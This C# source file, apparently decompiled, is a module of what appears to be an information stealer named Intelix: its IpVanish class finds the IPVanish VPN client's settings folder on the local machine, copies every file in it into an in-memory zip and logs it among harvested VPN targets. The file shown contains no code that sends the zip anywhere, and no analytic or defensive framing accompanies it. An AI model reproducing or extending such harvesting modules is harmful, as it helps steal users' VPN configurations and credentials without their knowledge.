using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class IpVanish : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "IPVanish", "Settings");
		if (Directory.Exists(text))
		{
			string text2 = "IPVanish";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "IPVanish";
			zip.AddDirectoryFiles(text, text2);
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Vpns.Add(counterApplications);
		}
	}
}
